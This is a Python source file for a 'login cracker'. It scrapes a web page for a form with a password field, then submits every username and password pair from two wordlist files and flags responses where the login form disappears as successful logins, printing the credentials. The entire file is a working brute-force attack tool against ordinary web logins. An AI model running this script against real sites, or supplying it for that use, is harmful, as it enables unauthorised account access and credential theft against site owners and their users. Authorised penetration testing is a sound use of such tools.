from bs4 import BeautifulSoup
from typing import List, Optional
from requests_html import HTMLSession
from requests import models
from urllib.parse import urljoin
import time


class HtmlInput:
    """ Represents the data of an HTML input element.
    """

    def __init__(self, id: str, type: str, name: str, value: str):
        self.id = id
        self.type = type
        self.name = name
        self.value = value


class HtmlForm:
    """ Represents the inputs and target action of an HTML form in a session.
    """

    def __init__(self, method: str, action: str, inputs: List[HtmlInput]):
        # GET is the default request method if none are specified
        self.method = method.upper() if method is not None else "GET"
        # Request URL
        self.action = action.lower() if action is not None else ""
        self.inputs = inputs

    def submit_form(self, url: str, u_input_index: int, p_input_index: int,
                    username: str, password: str) -> models.Response:
        """ Create a POST or GET request to attempt login

        This function is used to send a POST or GET request to the targeted URL.
        It needs a url, username and password fields indexes,
        username and password as arguments.
        """

        # JSON data to send via request
        action_url = urljoin(url, self.action)
        data = {}

        # Add Valued to the input elements, but skips submit
        for html_input in self.inputs:
            if html_input.type.lower() != "submit":
                data[html_input.name] = html_input.value

        data[self.inputs[u_input_index].name] = username
        data[self.inputs[p_input_index].name] = password

        if self.method == "POST":
            return self.session.post(action_url, data=data)
        elif self.method == "GET":
            return self.session.get(action_url, params=data)
        else:
            raise print("Can't handle " + self.method + " requests")


def find_login_form(url: str) -> Optional[HtmlForm]:
    """Returns all form tags found on a web page's `url`
    """
    session = HTMLSession()
    response = session.get(url)
    return _find_login_form_from_response(response, session)


def _find_login_form_from_response(response, session) -> Optional[HtmlForm]:
    soup = BeautifulSoup(response.html.html, "html.parser")
    forms = soup.find_all("form")
    converted_forms = list(map(_convert_form, forms))
    for converted_form in converted_forms:
        if contains_password_input(converted_form):
            converted_form.session = session
            return converted_form
    return None


def contains_password_input(form: HtmlForm):
    """ Checks if any of the input fields in a form contains "Password"
    """

    for html_input in form.inputs:
        if html_input.type.lower() == "password":
            return True
    return False


def _convert_form(form) -> HtmlForm:
    action = form.attrs.get("action")
    method = form.attrs.get("method")
    inputs = form.find_all("input")
    converted_inputs = list(map(_convert_input, inputs))
    return HtmlForm(method, action, converted_inputs)


def _convert_input(input) -> HtmlInput:
    input_id = input.attrs.get("id", "")
    input_type = input.attrs.get("type", "text")
    input_name = input.attrs.get("name")
    input_value = input.attrs.get("value", "")
    return HtmlInput(input_id, input_type, input_name, input_value)


def print_form(form: HtmlForm):
    """ Prints a form
    """

    print("Form:")
    print(" Method: {}".format(form.method.upper()))
    print(" Url: {}".format(form.action))
    print(" Inputs:")
    for i, input in enumerate(form.inputs, start=1):
        print(f"  Input #{i}: name={input.name}, type={input.type}, id={input.id}")


def run_login_cracker(url: str, u_index: int, p_index: int, users_file: str, password_file: str):
    start_time = time.time()
    print("Started Login Cracking")
    login_form = find_login_form(url)

    # If a login form is found, continue with the login cracking.
    if login_form is not None:

        # Loops through all of the usernames and passwords and submits login form
        with open(users_file, "r") as users, open(password_file, "r") as passwords:
            for user in users:
                username = user.strip()
                passwords.seek(0, 0)
                for passwd in passwords:
                    password = passwd.strip()
                    response = login_form.submit_form(url, u_index - 1, p_index - 1, username, password)
                    session = login_form.session
                    # If the login form is gone the login might have been successful.
                    if _find_login_form_from_response(response, session) is None and response.status_code < 400:
                        print("Looks like a success! \n Username: {0}\n Password: {1}".format(username, password))
                        print(response.content)
                    time.sleep(0.5)

        print("Finished after: {}".format(time.time() - start_time))
    else:
        print("No login form found")
